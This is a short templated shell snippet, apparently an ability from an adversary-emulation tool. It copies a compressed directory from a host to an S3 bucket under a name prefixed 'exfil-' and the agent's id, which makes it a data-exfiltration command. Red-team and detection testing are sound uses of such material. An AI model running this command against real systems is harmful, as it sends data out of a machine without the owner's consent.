LocalFile='#{host.dir.compress}';
RemoteName="exfil-#{paw}-$(basename $LocalFile)";
aws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;
